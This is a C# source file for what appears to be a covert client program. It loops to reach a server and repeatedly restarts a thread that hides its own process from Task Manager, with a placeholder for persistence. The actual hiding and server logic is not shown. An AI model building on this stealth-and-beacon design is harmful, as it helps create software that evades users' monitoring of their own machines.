using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading;
using Client.API;

namespace Client
{
    class Program
    {
        private static  LocalMachine _ThisPC = new LocalMachine();
        private static  Server       _Server = new Server();
        private static Thread _ThreadHandler;

        // Contents of this function should only be run once at the beginning.
        private static void Init()
        {
            Logger.IsEnabled = true;
            Console.WriteLine("[{0}] Logging\n", Logger.IsEnabled ? "ON" : "OFF");


            //TODO: Insert _Persistence checks here.

            CheckMachineStates();

            // Hide this process from the task manager.
            _ThreadHandler = new Thread(ManageThreads);
            _ThreadHandler.Start();
          
        }

        static void Main(string[] args)
        {
            Init();
            do
            {
                // If we are offline.
                while (_ThisPC.Status == LocalMachine.State.OFFLINE)
                {
                    _ThisPC.Reconnect();
                }

                // If we are online, but the server is unreachable.
                while (_Server.Status == Server.State.OFFLINE && _ThisPC.Status == LocalMachine.State.ONLINE)
                {
                    _Server.Probe();
                }

                while (_ThisPC.Status == LocalMachine.State.ONLINE && _Server.Status == Server.State.ONLINE)
                {
                    //CheckMachineStates();
                    //Start();
                }

                
                Thread.Sleep(1000);
            } while (true);
        }

        // Check if we are online, then if the server is reachable.
        private static void CheckMachineStates()
        {
            _ThisPC.Reconnect();
            _Server.Probe();
        }

        private static void ManageThreads()
        {
            Thread processScanThread;   
            while (ThreadedAPI.IsRunning)
            {
                processScanThread = new Thread(ThreadedAPI.TProcs.HideProccess);

                if (!processScanThread.IsAlive)
                {
                    Console.WriteLine("Thread died, rebooting her up!");

                    processScanThread.Start(Process.GetCurrentProcess().ProcessName);
                }

                Thread.Sleep(1);
            }
        }


    }
}
